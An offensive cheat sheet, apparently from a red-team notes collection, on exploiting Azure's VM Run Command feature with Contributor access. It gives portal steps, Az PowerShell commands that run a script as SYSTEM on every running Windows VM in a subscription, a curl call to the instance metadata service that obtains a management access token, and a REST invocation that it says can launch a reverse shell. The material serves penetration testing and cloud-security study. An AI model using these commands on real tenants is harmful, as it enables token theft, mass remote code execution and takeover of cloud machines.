# Exploiting Run Command Feature

## Requirements: Contributor account/role access

### The Run Command feature of Azure VMs is a platform feature used to run scripts on VMs remotely using the VM agent. It can be used to run PowerShell scripts on Windows VMs and shell scripts on Linux VMs. It is generally used by administrators or developers to quickly diagnose and remediate VM access and network issues and get the VM back to a good state.

### Here is some information to keep in mind when exploiting this feature:

- Scripts run as the System account on Windows VMs and as an elevated user (typically root) on Linux VMs.

- We can only run one script at a time through the feature.

- Interactive scripts that prompt for user information are not supported.

- Outbound connectivity from the VM to Azure public IP addresses on port 443 is required to return the results of the script.

# 1) Azure Portal

 - Go to the "Virtual Machine" blade

 - Run command has prebuilt commands that can be run in the portal (You can run your own custom commands ofc)

 - Select "RunPowerShellScript" or "RunShellScript" for Linux (You can run your own custom commands for both Windows and Linux, as SYSTEM or root)

# 2) Az Powershell module

 - $VMs = Get-AzVM -Status | where {($_.PowerState -EQ "VM running") -and ($_.StorageProfile.OSDisk.OSType -eq "Windows")}

 - $VMs | select ResourceGrouName,Name (List the running Windows VMs and cast them to the VMs variable)

 - echo "whoami" > whoami.ps1

 - $VMs | Invoke-AzVMRunCommand -CommandId 'RunPowerShellScript' -ScriptPath .\whoami.ps1 (Run your powershell script on all VMs in the subscription)

# 3) Azure REST APIs

 - curl -H Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?apiversion=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' | jq (Obtain an access token that can be used to access the Azure management API endpoint)

 - $mgmtToken = "TOKEN_HERE"

 - Invoke-AzVMCommandREST -commandToExecute "whoami > test.txt" -managementToken $mgmtToken TENANT_ID (Run a command via REST API method. You can use this to start a reverse shell on target)
